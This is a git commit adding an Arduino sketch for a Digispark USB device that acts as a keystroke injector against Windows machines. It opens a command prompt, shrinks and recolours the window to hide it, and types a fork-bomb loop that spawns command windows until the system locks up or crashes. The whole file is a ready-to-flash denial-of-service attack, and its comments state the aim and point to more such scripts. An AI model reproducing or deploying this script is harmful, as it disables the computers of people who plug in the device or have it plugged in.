f536d47a79d0b57f349917c5c5e5c21226d7d630
Messer <109568683+m6sser@users.noreply.github.com>
2023-02-01 16:27:54 -0300

    Add files via upload

---
+++ Fork_Bomb.ino
@@ -0,0 +1,31 @@
+//This script opens up a Windows command prompt and makes it open up another instance of itself and so on until the machine can take it no more and either locks or crashes.
+
+// For more scripts checkout: https://github.com/m6sser
+// m6sser | 01/02/2023 @14:00 UTC
+
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  //Obfuscate the terminal
+  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("COLOR EF");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //Run the fork bomb
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+    /*Stops the digispark from running the scipt again*/
+  }
+}
